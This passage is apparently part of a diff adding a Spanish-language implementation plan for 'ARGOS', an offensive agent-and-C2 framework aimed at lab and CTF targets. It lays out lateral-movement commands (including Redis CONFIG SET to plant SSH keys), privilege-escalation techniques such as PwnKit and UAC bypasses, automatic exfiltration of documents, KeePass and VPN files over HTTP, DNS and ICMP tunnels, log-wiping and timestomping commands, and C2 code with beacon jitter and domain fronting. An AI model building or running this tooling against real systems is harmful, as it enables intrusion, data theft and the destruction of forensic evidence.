+     - Conectar via wsman (libreria winrm-go)
+     - Invoke-Command { Start-Process agent_binary }
+  4. Scheduled Task remoto:
+     - Conectar via ITaskScheduler RPC
+     - Crear tarea que ejecuta agente en T+30s
+
+  Windows -> Linux:
+  1. SSH con credenciales capturadas:
+     - gossh.Dial() + upload agente via SFTP + ejecucion remota
+  2. SMB share writeable:
+     - Subir agente a share → esperar ejecucion por usuario
+
+  Linux -> Linux:
+  1. SSH key harvest + lateral move:
+     - Recolectar ~/.ssh/id_rsa del host actual
+     - Usar SSH con key forwarding al siguiente host
+  2. Redis CONFIG REWRITE (si redis noauth detectado en vecino):
+     - CONFIG SET dir /root/.ssh/
+     - CONFIG SET dbfilename authorized_keys
+     - SET payload public_key_string
+     - SAVE → SSH key anadida como authorized_keys
+
+  Linux -> Windows:
+  1. Impacket-psexec via Python subprocess (si el agente tiene Python)
+  2. WMIExec via Python subprocess
+
+4.3  P R I V I L E G E   E S C A L A T I O N
+───────────────────────────────────────────────
+Archivo NUEVO: agents/cell/privesc/privesc.go (~200 lineas)
+
+Modulos:
+
+  Linux:
+  1. Sudo misconfiguration check:
+     - sudo -l: detectar comandos permitidos sin password
+     - GTFOBins lookup: mapear binario a tecnica de escalada
+  2. SUID binary enumeration:
+     - find / -perm -4000 -type f 2>/dev/null
+     - Buscar binarios con SUID en GTFOBins database
+     - Explotar: /usr/bin/pkexec -> CVE-2021-4034 (PwnKit)
+  3. Cron job hijacking:
+     - cat /etc/crontab, ls -la /etc/cron.*
+     - Encontrar scripts ejecutados por root con permisos writable
+  4. Capabilities check:
+     - getcap -r / 2>/dev/null
+     - cap_setuid+ep -> escalar via setuid(0)
+  5. Unmounted filesystems:
+     - mount, buscar /etc/fstab con opciones user,noauto
+  6. Kernel exploit suggestion:
+     - uname -r → buscar CVEs para esa version de kernel
+
+  Windows:
+  1. Token manipulation:
+     - FindProcessByName("winlogon.exe") -> OpenProcessToken -> DuplicateTokenEx
+     - ImpersonateLoggedOnUser/CreateProcessWithTokenW
+  2. UAC bypass:
+     - fodhelper.exe + registry hijack
+     - eventvwr.exe + registry + fake DLL
+     - computerdefaults.exe + registry
+  3. Service misconfiguration:
+     - Identificar servicios con binarios writable por el usuario
+     - sc config binPath= cmd.exe /c agent.exe
+  4. AlwaysInstallElevated:
+     - Registry HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+     - MSI wrapper para el agente + msiexec /quiet /i agent.msi
+  5. Unquoted service paths:
+     - wmic service get name,pathname
+     - Encontrar paths con espacios sin comillas
+
+4.4  D A T A   E X F I L T R A T I O N
+────────────────────────────────────────
+Archivo NUEVO: agents/cell/exfil/exfil.go (~150 lineas)
+
+Modulos:
+  1. HTTP/S POST al C2 (Chameleon-wrapped):
+     - Compression (gzip) + AES-GCM encryption antes del wrap
+     - Chunked upload para archivos grandes (> 10MB)
+     - Resume support si la conexion se corta
+  2. DNS tunneling (fallback si HTTP esta bloqueado):
+     - Encoding: base32 subdominio.c2-dns.com (max 63 chars por label)
+     - Rate limit: 1 query/segundo para no saturar DNS
+  3. ICMP tunneling (fallback ultimo):
+     - Raw socket ICMP Echo con payload en data field
+     - Solo si el agente tiene raw socket capability
+
+  Target files automatico:
+  1. Buscar archivos interesantes en Desktop, Documents, Downloads
+  2. Extensiones: .doc*, .xls*, .pdf, .pst, .ost, .kdbx, .rdp, .ovpn
+  3. Max size configurable (default 50MB por archivo)
+  4. Exfiltrar incrementalmente (primero lista de archivos, luego contenido)
+  5. Flag discovery automatica (integra FlagHunter) y exfil de flags
+
+4.5  C L E A N U P   /   A N T I - F O R E N S I C S
+───────────────────────────────────────────────────────
+Archivo NUEVO: agents/cell/cleanup/cleanup.go (~120 lineas)
+
+  Windows:
+  1. Clear event logs: wevtutil cl Security, System, Application
+  2. Clear prefetch: del C:\Windows\Prefetch\*.pf
+  3. Clear recent files: del %APPDATA%\Microsoft\Windows\Recent\*
+  4. Clear shellbags: registry NTUSER.DAT\...\ShellNoRoam\BagMRU
+  5. Clear RDP connection history: registry Terminal Server Client entries
+  6. Timestomp: cambiar timestamps de binarios del agente
+  7. Wipe temporary files: %TEMP%, %WINDIR%\Temp
+  8. USN Journal: fsutil usn deletejournal (requiere admin)
+
+  Linux:
+  1. Clear bash history: cat /dev/null > ~/.bash_history, unset HISTFILE
+  2. Clear wtmp/btmp/utmp (si root): truncate -s 0 /var/log/wtmp
+  3. Clear auth log: truncate -s 0 /var/log/auth.log
+  4. Clear syslog: truncate -s 0 /var/log/syslog
+  5. Remove agent artifacts: rm -rf /tmp/.argos-*,
+     desconectar de crontab, systemd, ssh authorized_keys
+
+
+================================================================================
+FASE 5 — C 2   H A R D E N I N G
+================================================================================
+
+5.1  C H A M E L E O N   C 2   —   I N T E G R A C I O N   R E A L
+──────────────────────────────────────────────────────────────────────
+Archivo a modificar: evasion/chameleon_c2.py
+
+Problema actual:
+  - _handler() unwraps pero no procesa con el Director
+  - _build_response() devuelve dict hardcodeado (no proto serializado)
+  - Sin TLS, sin auth
+
+Refactor:
+  class ChameleonServer:
+      def __init__(self, host, port, director, tls_cert=None):
+          self.director = director
+          self.chameleon = ChameleonC2()
+          self._clients = {}
+
+      async def _handler(self, websocket, path=""):
+          agent_id = None
+          async for message in websocket:
+              # 1. Desenvolver payload protobuf del JSON camuflado
+              raw = self.chameleon.unwrap(message)
+              if not raw:
+                  continue
+
+              # 2. Deserializar AgentEvent protobuf
+              event = argos_pb2.AgentEvent()
+              event.ParseFromString(raw)
+
+              # 3. Procesar via Director (mismo pipeline que gRPC)
+              if event.type == argos_pb2.HEARTBEAT:
+                  await self.director.process_heartbeat(event.agent_id, event.hb)
+                  agent_id = event.agent_id
+                  self._clients[agent_id] = websocket
+              elif event.type == argos_pb2.SCAN_RESULT:
+                  finding = self._scan_to_finding(event.scan)
+                  cmd = await self.director.process_finding(agent_id, finding)
+              # ... otros tipos de eventos
+
+              # 4. Si el Director tiene comandos pendientes, enviarlos
+              cmd = await self._get_pending_command(agent_id)
+              if cmd:
+                  # Serializar DirectorCommand a bytes, wrappear, enviar
+                  wrapped = self.chameleon.wrap(cmd.SerializeToString())
+                  await websocket.send(wrapped)
+
+      async def _get_pending_command(self, agent_id):
+          try:
+              return await asyncio.wait_for(
+                  self.director._pending_commands[agent_id].get(),
+                  timeout=0.1
+              )
+          except (KeyError, asyncio.TimeoutError):
+              return None
+
+  Integracion con gRPC server:
+  - El GrpcServer tambien pasa el director al ChameleonServer
+  - Ambos servidores (gRPC:50051 y WS:8443) comparten el mismo Director
+  - El agente puede elegir el protocolo segun disponibilidad de red
+  - Fallback order: gRPC -> WebSocket -> DNS -> ICMP
+
+  TLS en WebSocket:
+  - ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+  - ssl_context.load_cert_chain(certfile, keyfile)
+  - websockets.serve(..., ssl=ssl_context)
+
+5.2  B E A C O N   J I T T E R   R E A L
+──────────────────────────────────────────
+Implementacion en el agente Go:
+
+  type JitterConfig struct {
+      BaseInterval time.Duration  // beacon base: 60s, 120s, 15s
+      JitterRange  float64        // +/- 20%, 40% del base
+      SleepAfterCmd time.Duration // despues de recibir comando, dormir mas
+  }
+
+  func (c *Cell) jitteredSleep() {
+      jitter := time.Duration(
+          float64(c.cfg.BaseInterval) *
+          (1.0 + (rand.Float64()-0.5)*c.cfg.JitterRange))
+      time.Sleep(jitter)
+  }
+
+  func (c *Cell) beacondWithJitter() {
+      for {
+          select {
+          case <-c.ctx.Done():
+              return
+          case cmd := <-c.commandChan:
+              // Recibio comando, responder inmediatamente
+              c.executeCommand(cmd)
+              // Despues de comando, beacon mas lento (evitar correlacion)
+              time.Sleep(c.cfg.SleepAfterCmd)
+          case <-time.After(c.jitteredInterval()):
+              // Heartbeat normal
+              c.sendHeartbeat()
+          }
+      }
+  }
+
+5.3  M U L T I - P R O T O C O L   F A L L B A C K
+─────────────────────────────────────────────────────
+Archivo NUEVO: agents/cell/comms/fallback.go (~200 lineas)
+
+  type Protocol int
+  const (
+      ProtoGRPC Protocol = iota
+      ProtoWebSocket
+      ProtoDNS
+      ProtoHTTP
+      ProtoICMP
+  )
+
+  type CommsManager struct {
+      order []Protocol          // orden de preferencia
+      active ProtoGRPC
+      clients map[Protocol]interface{}
+  }
+
+  func (cm *CommsManager) Connect(ctx context.Context) error {
+      for _, proto := range cm.order {
+          err := cm.tryConnect(ctx, proto)
+          if err == nil {
+              cm.active = proto
+              log.Printf("[Comms] Conectado via %s", cm.active)
+              return nil
+          }
+          log.Printf("[Comms] %s fallo: %v, probando siguiente...", proto, err)
+      }
+      return fmt.Errorf("todos los protocolos fallaron")
+  }
+
+  func (cm *CommsManager) Send(event *pb.AgentEvent) error {
+      return cm.clients[cm.active].send(event)
+  }
+
+  func (cm *CommsManager) Recv() (*pb.DirectorCommand, error) {
+      return cm.clients[cm.active].recv()
+  }
+
+  // Si el protocolo activo falla -> reconectar con el siguiente de la lista
+
+5.4  E N C R Y P T E D   C O M M S   A   N I V E L   A G E N T E
+───────────────────────────────────────────────────────────────────
+  - gRPC: TLS con cert mutual (mTLS) entre agente y C2
+  - WebSocket: TLS + payload AES-GCM dentro del JSON camuflado
+  - DNS: AES-GCM encrypt del payload antes de dividir en queries
+  - HTTP: TLS + Chameleon wrap + AES-GCM encrypt
+  - ECDH key exchange inicial para generar key por sesion
+  - Anti-replay: nonce + timestamp en cada mensaje
+
+5.5  C 2   I N F R A S T R U C T U R E   R E S I L I E N T
+─────────────────────────────────────────────────────────────
+  - Director multi-instance (primary + secondary) con etcd leader election
+  - Redis pub/sub para sincronizacion entre instancias
+  - Agente soporta lista de C2 URLs (primary, secondary, tertiary)
+  - Redirector frontal: Nginx/HAProxy → multiples C2 instances
+  - Domain fronting via CDN (CloudFront, Azure CDN) con host header legitimo
+  - C2 domain rotation: lista de dominios embebida, rotacion cada N horas
+
+
+================================================================================
+FASE 6 — U X   Y   P R O F E S I O N A L I S M O
+================================================================================
+
+6.1  D A S H B O A R D   W E B   ( R E A C T   +   g R P C - W e b )
+───────────────────────────────────────────────────────────────────────
+NUEVO: web/ dashboard con React 18 + TypeScript
+
+Stack:
+  - Frontend: React 18 + TypeScript + Tailwind CSS + Cytoscape.js (grafo)
+  - gRPC-Web: grpc-web + protobuf-ts para streaming del OperatorConsole
+  - Build: Vite
+
+Vistas:
+  1. Mission Overview:
+     - Tarjeta de estado: mission_id, target, goal, profile, GDS
+     - Timeline de eventos (scroll infinito via WatchMission stream)
+     - Indicadores: hosts online, servicios detectados, flags capturadas
+
+  2. Live World Graph (Cytoscape.js):
+     - Nodos: HOST (icono por SO), SERVICE (icono por tipo),
+       CREDENTIAL (icono llave), FLAG (icono bandera)
+     - Aristas: HAS_SERVICE, EXPLOITS, TRUSTS, LATERAL_MOVE
+     - Layout: CoSE-Bilkent (compound spring embedder)
+     - Interactivo: click en nodo → detalle, zoom, pan, filtros
+     - Actualizacion en tiempo real via GetWorldGraph polling (2s)
+
+  3. Agent Panel:
+     - Lista de agentes con: ID, IP, OS, last beacon, status, PID
+     - Acciones: kill, sleep N segundos, deploy module, exec command
+     - Shell interactiva via ExecuteCommand RPC
+
+  4. Decision Queue:
+     - Tabla de decisiones pendientes con: accion, confianza, riesgo, origen
+     - Botones: approve / reject / modify (custom command)
+     - Historial de decisiones pasadas con resultado
+
+  5. Reports:
+     - Generar reporte HTML/PDF con un click
+     - Template: executive summary + technical details + ATT&CK matrix
+     - ATT&CK heatmap: tecnicas usadas, coloreadas por fase
+
+6.2  T U I   D A S H B O A R D   —   M I G R A R   A   g R P C   S T R E A M
+────────────────────────────────────────────────────────────────────────────────
+Archivo a modificar: ui/dashboard.py
+
+Problema actual: solo lee SQLite local. No conecta al Director.
+
+Refactor:
+  1. Agregar cliente gRPC asyncio al dashboard:
+     self.channel = grpc.aio.insecure_channel("localhost:50051")
+     self.stub = argos_pb2_grpc.OperatorConsoleStub(self.channel)
+
+  2. Reemplazar refresh_data() (SQLite polling) por WatchMission stream:
+     async for update in self.stub.WatchMission(MissionRequest()):
+         event = json.loads(update.payload)
+         await self.handle_event(event)
+
+  3. action_approve_decision via gRPC:
+     await self.stub.ResolveDecision(DecisionResponse(
+         decision_id=did, approved=True))
+
+  4. Mantener compatibilidad offline: si gRPC no disponible, fallback a
+     SQLite local (modo actual)
+
+6.3  R E P O R T   G E N E R A T I O N   R E A L
+───────────────────────────────────────────────────
+Archivo a modificar: ui/cli.py (comando report generate)
+
+  Template HTML (Jinja2):
+  1. Executive Summary:
+     - Mision ID, duracion, target, goal
+     - Hosts comprometidos / totales, flags capturadas, GDS maximo
+     - Rating: Success / Partial / Failed
+
+  2. Timeline:
+     - Eventos ordenados cronologicamente
+     - Formato: [HH:MM:SS] AGENT_REGISTERED agent-01 @ 10.0.0.1
+     - Filtrable por tipo de evento
+
+  3. Attack Graph:
+     - Render via Cytoscape.js embebido (standalone HTML)
+     - Nodos y aristas coloreados por estado (planned/executed/success/fail)
+
+  4. MITRE ATT&CK Mapping:
+     - Tabla: Tactica | Tecnica | MITRE ID | Fecha | Resultado
+     - Heatmap visual de tecnicas usadas
+
+  5. Credentials:
+     - Tabla: Username | Type (password/hash/ticket) | Valor (redacted) | Host
+
+  6. Flags:
+     - Tabla: Flag | Host | Path | Timestamp
+
+  7. Recommendations:
+     - Basado en hallazgos: "Parchear Apache 2.4.49", "Deshabilitar SMBv1"
+
+  PDF via WeasyPrint:
+  - CSS @print media queries para paginacion
+  - Header/footer con logo de ARGOS y numero de pagina
+
+6.4  M I S S I O N   R E P L A Y
+──────────────────────────────────
+Archivo NUEVO: core/mission_replay.py (~80 lineas)
+
+  class MissionReplay:
+      def __init__(self, event_log_path):
+          self.events = [json.loads(l) for l in open(event_log_path)]
+
+      async def replay(self, speed: float = 1.0):
+          """Reproduce una mision desde el event log.
+             speed=2.0 reproduce al doble de velocidad."""
+          bus = EventBus()  # Bus aislado para replay
+          kt = KnowledgeTree()
+          for event in self.events:
+              await bus.emit(event["type"], event["data"])
+              # Reconstruir KnowledgeTree incrementalmente
+              await self._apply_to_kt(kt, event)
+              await asyncio.sleep(event["delay"] / speed)
+          return kt, bus.get_history()
+
+  Consola:
+  argos> replay missions/abc123.json --speed 2.0
+    [00:05] Agent registered
+    [00:12] Host discovered: 10.100.0.20
+    [00:18] SMB:445 detected → Decision: smb_eternalblue (85%)
+    [00:22] Operator approved → exploit launched
+    [00:45] Session created: sess-001 → host OWNED
+    [00:52] Flag captured: CTF{Argus_Demo}
+    [01:02] Mission complete.
+
+6.5  C O N S O L A   I N T E R A C T I V A   —   M E J O R A S
+─────────────────────────────────────────────────────────────────
+Archivo a modificar: argos_console.py
+
+Nuevos comandos:
+  argos> connect cell     — Lanza agente Go y conecta via gRPC real
+  argos> exploit 10.0.0.1 445 — Explotacion manual contra IP:puerto
+  argos> chain host1 host2 — Cadena de exploits multi-step
+  argos> exfil <agent> <path> — Exfiltrar archivo de un agente
+  argos> shell <agent>    — Shell interactiva via ExecuteCommand RPC
+  argos> loot             — Mostrar tabla de loot (creds, flags, sessions)
+  argos> map              — Imprimir mapa ASCII del Knowledge Tree
+  argos> replay <file>    — Reproducir mision desde event log
+  argos> listen           — Arrancar gRPC + WS servers y esperar agentes
+  argos> set profile ghost — Cambiar perfil en caliente
+
+6.6  T E S T I N G   &   C I / C D
+─────────────────────────────────────
+  - GitHub Actions CI:
+    - Python: ruff lint + black check + pytest (34 tests)
+    - Go: go vet + go test ./... en agents/cell, agents/stager
+    - Integration: demo_integration.py contra lab (Docker/Podman)
+  - Pre-commit hooks:
+    - ruff, black, gofmt, go vet
+  - Coverage: pytest-cov (reporte HTML), go test -cover
+  - Fuzzing: go-fuzz para parsers de fingerprint (HTTP, SSH, SMB)
+  - E2E tests: arrancar Director + gRPC + agente mock, verificar flujo completo
+
+
+================================================================================
+R E S U M E N   P O R   F A S E S
+================================================================================
+
+FASE 1 (gRPC)          ~15h    Desbloquea toda la comunicacion real
+  - Stubs proto generados
+  - Command pipeline (Director -> cola -> Beacon stream -> agente)
+  - Go agent gRPC real
+  - Comando 'connect' en consola
+
+FASE 2 (Recon)         ~30h    El agente detecta TODO con detalle profesional
+  - HTTP/SSH/MySQL/MSSQL/PG/FTP/RDP/Redis/SNMP fingerprint
+  - OS detection multi-fuente
+  - Web path bruteforce
+  - Integracion de modulos en scanner.go
+
+FASE 3 (Exploit)       ~25h    Ataques reales contra los targets del lab
+  - Decision Engine -> MSF RPC con mapping de acciones a modulos
+  - Brute force module (SSH, FTP, RDP, SMB)
+  - Default credential checker
+  - Exploit chaining (multi-step)
+  - Comando 'exploit' / 'chain' en consola
+
+FASE 4 (Post-Exploit)  ~20h    El agente extrae valor real del target
+  - Credential dump REAL (LSASS direct syscalls, SAM parsing)
+  - Persistencia avanzada (WMI, COM hijacking, PAM, LD_PRELOAD)
+  - Lateral movement (PsExec, WMI, WinRM, SSH pivot)
+  - Privilege escalation (sudo/GTOBins, SUID, UAC bypass)
+  - Exfiltration (HTTP, DNS, ICMP)
+
+FASE 5 (C2)            ~15h    Comunicacion profesional y resiliente
+  - Chameleon C2 integrado con Director real
+  - TLS en gRPC + WebSocket
+  - Multi-protocol fallback (gRPC -> WS -> DNS -> ICMP)
+  - Beacon jitter real con configuracion por perfil
+  - C2 infrastructure con domain fronting
+
+FASE 6 (UX)            ~20h    Herramienta profesional para operadores
+  - Dashboard web (React + Cytoscape.js + gRPC-Web streaming)
+  - TUI dashboard migrado a gRPC stream
+  - Report generation (HTML/PDF con ATT&CK mapping)
+  - Mission replay
+  - Consola interactiva completa (10+ comandos nuevos)
+
+─────────────────────────────────────────────────────────────────────
+TOTAL ESTIMADO:        ~125h   (3-4 semanas full-time, ~6 semanas part-time)
+─────────────────────────────────────────────────────────────────────
+
+================================================================================
+P R I O R I D A D   D E   I M P L E M E N T A C I O N
+================================================================================
+
+Orden recomendado (cada fase desbloquea la siguiente):
+
+  Semana 1:  Fase 1 (gRPC)
+  Semana 2:  Fase 2 (Recon) + inicio Fase 3 (Exploit)
+  Semana 3:  Fase 3 (Exploit) + Fase 4 (Post-Exploit)
+  Semana 4:  Fase 4 (Post-Exploit) + Fase 5 (C2)
+  Semana 5:  Fase 5 (C2) + Fase 6 (UX)
+  Semana 6:  Fase 6 (UX) + testing final + documentacion
+
+MVP utilizable despues de Fase 3 (3 semanas):
+  - Agente Go escanea lab real, reporta via gRPC al Director
+  - Decision Engine evalua servicios reales
+  - MSF ejecuta exploits reales
+  - Operador controla todo desde la consola interactiva
+
+================================================================================
+Documento generado: 2026-05
+Version: ARGOS v2.1 plan
+================================================================================
